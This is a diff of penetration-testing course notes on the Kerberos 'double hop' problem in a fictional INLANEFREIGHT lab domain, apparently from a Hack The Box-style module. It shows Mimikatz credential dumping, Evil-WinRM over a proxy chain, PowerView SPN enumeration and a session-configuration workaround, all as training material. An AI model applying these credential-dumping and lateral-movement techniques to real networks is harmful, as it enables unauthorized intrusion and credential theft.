@@ -12,7 +12,7 @@ Lorsqu'on s'authentifie avec Kerberos, on obtient un **"ticket"** qui nous perme
 
 ***
 
-#### **Explication du problème du "Double Hop" :**
+#### <mark style="color:green;">**Explication du problème du "Double Hop" :**</mark>
 
 Le **Double Hop** survient dans un scénario où :
 
@@ -48,7 +48,7 @@ Lorsque l'authentification par mot de passe est utilisée, avec PSExec par exemp
 Voyons un exemple rapide. Si nous nous authentifions sur la machine distante via WinRM et lançons Mimikatz, nous ne voyons pas les identifiants de l'utilisateur `backupadm` en mémoire.
 
 {% code fullWidth="true" %}
-```powershell-session
+```powershell
 PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
 [DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
 [DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
@@ -135,7 +135,7 @@ We can also connect to the remote host via host A and set up a PSCredential obje
 After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.
 
 {% code fullWidth="true" %}
-```shell-session
+```powershell
 *Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
 
 |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
@@ -153,7 +153,7 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
 
 If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.
 
-```shell-session
+```powershell
 *Evil-WinRM* PS C:\Users\backupadm\Documents> klist
 
 Current LogonId is 0:0x57f8a
@@ -175,7 +175,7 @@ Cached Tickets: (1)
 So now, let's set up a PSCredential object and try again. First, we set up our authentication.
 
 {% code overflow="wrap" fullWidth="true" %}
-```shell-session
+```powershell
 *Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
 ```
 {% endcode %}
@@ -183,7 +183,7 @@ So now, let's set up a PSCredential object and try again. First, we set up our a
 Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.
 
 {% code fullWidth="true" %}
-```shell-session
+```powershell
 *Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
 ```
 {% endcode %}
@@ -191,7 +191,7 @@ Now we can try to query the SPN accounts using PowerView and are successful beca
 If we try again without specifying the `-credential` flag, we once again get an error message.
 
 {% code fullWidth="true" %}
-```shell-session
+```powershell
 get-domainuser -spn | select 
 
 *Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 
@@ -210,7 +210,8 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
 
 If we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.
 
-```cmd-session
+{% code fullWidth="true" %}
+```powershell
 C:\htb> klist
 
 Current LogonId is 0:0x1e5b8b
@@ -228,6 +229,7 @@ Cached Tickets: (4)
         Cache Flags: 0x2 -> DELEGATION
         Kdc Called: DC01.INLANEFREIGHT.LOCAL
 ```
+{% endcode %}
 
 ***
 
@@ -238,7 +240,7 @@ We've seen what we can do to overcome this problem when using a tool such as `ev
 Let's start by first establishing a WinRM session on the remote host.
 
 {% code fullWidth="true" %}
-```powershell-session
+```powershell
 PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
 ```
 {% endcode %}
@@ -246,7 +248,7 @@ PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -
 If we check for cached tickets using `klist`, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.
 
 {% code fullWidth="true" %}
-```powershell-session
+```powershell
 [ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist
 
 Current LogonId is 0:0x11e387
@@ -269,7 +271,7 @@ Cached Tickets: (1)
 We also cannot interact directly with the DC using PowerView
 
 {% code fullWidth="true" %}
-```powershell-session
+```powershell
 [ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
 [ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
 
@@ -279,7 +281,7 @@ We also cannot interact directly with the DC using PowerView
 **One trick we can use here is registering a new session configuration using the** [**Register-PSSessionConfiguration**](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) **cmdlet.**
 
 {% code fullWidth="true" %}
-```powershell-session
+```powershell
 PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
 ```
 {% endcode %}
@@ -289,7 +291,7 @@ Once this is done, we need to restart the WinRM service by typing `Restart-Servi
 After we start the session, we can see that the double hop problem has been eliminated, and if we type `klist`, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the `backupadm` user and all requests from our local machine will be sent directly to the Domain Controller.
 
 {% code fullWidth="true" %}
-```powershell-session
+```powershell
 PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
 [DEV01]: PS C:\Users\backupadm\Documents> klist
 
